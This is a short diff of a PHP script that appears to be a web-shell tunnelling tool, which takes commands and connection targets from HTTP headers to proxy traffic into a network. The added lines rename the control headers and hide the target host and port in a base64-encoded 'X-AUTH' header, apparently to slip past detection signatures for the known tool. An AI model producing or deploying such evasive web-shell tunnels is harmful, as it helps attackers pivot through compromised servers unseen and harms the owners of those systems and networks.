@@ -49,6 +49,7 @@ if( !function_exists('apache_request_headers') ) {
                 $arh[$arh_key] = $val;
             }
         }
+
         return( $arh );
     }
 }
@@ -60,12 +61,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET')
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 	set_time_limit(0);
 	$headers=apache_request_headers();
+	$headers['X-CMD'] = $headers['X-ENI'];
 	$cmd = $headers["X-CMD"];
     switch($cmd){
 		case "CONNECT":
 			{
-				$target = $headers["X-TARGET"];
-				$port = (int)$headers["X-PORT"];
+        		list($target, $port) = explode( ":", $headers['X-AUTH']);
+        		$target = base64_decode($target);
+        		$port   = (int)base64_decode($port);
+				#$target = $headers["X-TARGET"];
+				#$port = (int)$headers["X-PORT"];
 				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 				#if ($sock === false)
 				#{
